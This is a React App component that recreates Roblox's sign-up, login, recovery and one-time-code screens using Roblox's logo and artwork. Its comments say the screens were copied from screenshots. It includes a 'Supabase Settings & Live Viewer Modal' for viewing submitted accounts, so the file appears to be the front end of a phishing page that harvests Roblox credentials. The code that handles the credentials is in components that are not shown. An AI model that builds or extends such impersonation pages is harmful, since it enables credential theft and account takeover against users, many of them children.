import React, { useState } from 'react';
import Header from './components/Header';
import SignupCard from './components/SignupCard';
import LoginCard from './components/LoginCard';
import AccountRecoveryCard from './components/AccountRecoveryCard';
import DeviceBadges from './components/DeviceBadges';
import Footer from './components/Footer';
import SupabaseModal from './components/SupabaseModal';
import LegalModal from './components/LegalModal';
import SuccessModal from './components/SuccessModal';
import LoginSuccessModal from './components/LoginSuccessModal';
import OneTimeCodeModal from './components/OneTimeCodeModal';
import QuickSignInModal from './components/QuickSignInModal';

export default function App() {
  const [currentPage, setCurrentPage] = useState('signup'); // 'signup' | 'login' | 'recovery'
  const [currentUser, setCurrentUser] = useState(null);
  const [isSupabaseOpen, setIsSupabaseOpen] = useState(false);
  const [legalModal, setLegalModal] = useState({ isOpen: false, title: '' });
  const [signupSuccessData, setSignupSuccessData] = useState(null);
  const [loginSuccessUser, setLoginSuccessUser] = useState(null);

  // Login page specific modals
  const [isOneTimeCodeOpen, setIsOneTimeCodeOpen] = useState(false);
  const [isQuickSignInOpen, setIsQuickSignInOpen] = useState(false);

  const handleOpenLegal = (title) => {
    setLegalModal({ isOpen: true, title });
  };

  const handleCloseLegal = () => {
    setLegalModal({ isOpen: false, title: '' });
  };

  const handleLoginSuccess = (userData) => {
    setCurrentUser(userData);
    setLoginSuccessUser(userData);
  };

  const handleSignOut = () => {
    setCurrentUser(null);
    setLoginSuccessUser(null);
  };

  return (
    <div className="min-h-screen bg-[#0d0e11] text-white flex flex-col font-sans selection:bg-white/20 selection:text-white relative">
      {/* Background Image Container with Gradients */}
      <div className="absolute inset-x-0 top-0 h-[920px] sm:h-[980px] pointer-events-none overflow-hidden z-0">
        {/* The user-provided Roblox background collage */}
        <div
          className="absolute inset-0 bg-cover bg-top bg-no-repeat opacity-95 transition-opacity"
          style={{ backgroundImage: `url('/roblox-bg.jpg')` }}
        />

        {/* Dark radial and linear gradient overlays */}
        <div className="absolute inset-0 bg-radial-[at_center_top] from-black/40 via-black/60 to-black/90" />
        <div className="absolute inset-x-0 top-0 h-40 bg-gradient-to-b from-black/80 via-black/30 to-transparent" />
        <div className="absolute inset-x-0 bottom-0 h-48 bg-gradient-to-t from-[#0d0e11] via-[#0d0e11]/80 to-transparent" />
      </div>

      {/* Top Header */}
      <Header
        currentPage={currentPage}
        onNavigate={(page) => setCurrentPage(page)}
        onOpenSupabaseModal={() => setIsSupabaseOpen(true)}
        currentUser={currentUser}
        onSignOut={handleSignOut}
      />

      {/* Main Content Area */}
      <main className="relative z-10 flex-1 flex flex-col items-center justify-start pt-3 sm:pt-6 px-4">
        {/* Roblox Vector Logo (Centered above the active card) */}
        <div
          className="mb-5 sm:mb-6 select-none flex justify-center cursor-pointer hover:opacity-90 transition-opacity"
          onClick={() => setCurrentPage('signup')}
          title="Roblox Home"
        >
          <img
            src="/roblox-logo.svg"
            alt="ROBLOX"
            className="h-8 sm:h-10 md:h-11 w-auto object-contain drop-shadow-[0_4px_12px_rgba(0,0,0,0.8)] filter brightness-105"
            draggable={false}
          />
        </div>

        {/* Dynamic Card Views */}
        {currentPage === 'signup' && (
          <SignupCard
            onSignupSuccess={(data) => setSignupSuccessData(data)}
            onOpenTerms={() => handleOpenLegal('Terms of Use')}
            onOpenPrivacy={() => handleOpenLegal('Privacy Policy')}
          />
        )}

        {currentPage === 'login' && (
          <LoginCard
            onNavigateToSignup={() => setCurrentPage('signup')}
            onLoginSuccess={handleLoginSuccess}
            onOpenForgotPassword={() => setCurrentPage('recovery')}
            onOpenEmailCode={() => setIsOneTimeCodeOpen(true)}
            onOpenQuickSignIn={() => setIsQuickSignInOpen(true)}
          />
        )}

        {currentPage === 'recovery' && (
          <AccountRecoveryCard
            onBackToLogin={() => setCurrentPage('login')}
          />
        )}

        {/* Device Badges Section */}
        <DeviceBadges />
      </main>

      {/* Footer Section */}
      <div className="relative z-10 w-full mt-auto">
        <Footer onOpenLegalModal={handleOpenLegal} />
      </div>

      {/* Supabase Settings & Live Viewer Modal */}
      <SupabaseModal
        isOpen={isSupabaseOpen}
        onClose={() => setIsSupabaseOpen(false)}
      />

      {/* Legal Information Modal */}
      <LegalModal
        title={legalModal.title}
        isOpen={legalModal.isOpen}
        onClose={handleCloseLegal}
      />

      {/* Signup Success Modal */}
      <SuccessModal
        data={signupSuccessData}
        onClose={() => setSignupSuccessData(null)}
        onOpenSupabaseModal={() => setIsSupabaseOpen(true)}
      />

      {/* Login Success Modal */}
      <LoginSuccessModal
        user={loginSuccessUser}
        onClose={() => setLoginSuccessUser(null)}
        onSignOut={handleSignOut}
      />

      {/* Get One-Time Code Modal (Screenshot 2) */}
      <OneTimeCodeModal
        isOpen={isOneTimeCodeOpen}
        onClose={() => setIsOneTimeCodeOpen(false)}
        onLoginSuccess={handleLoginSuccess}
      />

      {/* Quick Sign In Modal (Screenshot 3) */}
      <QuickSignInModal
        isOpen={isQuickSignInOpen}
        onClose={() => setIsQuickSignInOpen(false)}
      />
    </div>
  );
}
